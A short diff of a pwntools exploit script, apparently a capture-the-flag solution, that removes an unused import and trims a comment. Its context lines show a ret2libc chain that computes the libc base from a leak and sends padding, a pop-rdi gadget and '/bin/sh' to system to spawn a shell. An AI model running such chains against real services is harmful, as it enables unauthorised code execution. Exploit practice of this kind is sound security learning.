@@ -1,4 +1,3 @@
-from elftools.construct import lib
 from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
@@ -38,7 +37,7 @@ info("Leak libc: " + hex(leak))
 libc.address = leak - (libc.sym.system -159696)
 
 p.sendline(flat(
-    p64(0)*4,                           # just padding
+    p64(0)*4,                           # padding
     pop_rdi_ret,
     next(libc.search(b'/bin/sh\x00')),
     libc.sym.system
